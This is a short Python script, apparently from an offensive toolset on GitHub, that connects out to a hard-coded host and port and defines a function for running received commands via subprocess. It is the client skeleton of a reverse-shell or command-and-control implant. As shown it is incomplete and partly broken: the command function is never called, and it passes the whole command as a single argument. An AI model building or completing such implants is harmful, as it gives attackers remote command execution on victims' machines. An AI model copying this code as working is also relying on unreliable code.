'''
Author : ISSAC
Github ; https://github.com/malbuffer4pt/IssacTools
'''

import socket
import os
import base64
import subprocess

rhost = '127.0.0.1'
rport = 5000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((rhost, rport))

def b64_enStr(data):
    return base64.b64encode(data.encode()).decode()

def b64_deStr(data):
    return base64.b64decode(data.encode()).decode()

def os_shell(cmd):
    sp = subprocess.Popen([cmd], stdout=subprocess.PIPE)
    return str(sp.stdout.read())

def recv_handler(recv):
    data = recv.decode().split('|')
    if data[0] == "msg":
        msg = base64.b64decode(data[1].encode()).decode()
        print(msg)

while True:
    recv = s.recv(1024)
    if (len(recv) == 0):
        s.close()
        print("Disconnected")
        break
    else:
        recv_handler(recv)